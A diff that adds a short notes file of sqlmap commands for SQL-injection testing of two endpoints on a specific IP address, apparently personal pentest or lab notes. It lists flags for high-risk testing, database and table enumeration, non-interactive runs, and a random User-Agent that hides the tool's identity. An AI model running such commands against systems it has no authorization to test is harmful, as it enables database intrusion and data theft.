@@ -1,0 +1,14 @@
+test queries: 
+sqlmap -u "http://35.188.102.108:8080/createAccount" --data="query=a" -p query --method="POST" --level=3 --risk=3 --batch --output-dir="output" --dbs --tables --random-agent
+sqlmap -u "http://35.188.102.108:8080/getAccount?accountId=1" --level=3 --risk=3
+
+FLAGS WE CAN USE
+-dbs enumerates databases
+-tables shows all tables
+--level=3
+--risk=3
+-v 0 to hide [INFO] lines
+--batch to force it to use Y instead of prompting user Y/n every time
+--random-agent randomly selected HTTP User-Agent header value instead of sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
+
+to use with Burp: sqlmap –r <path to the request file>
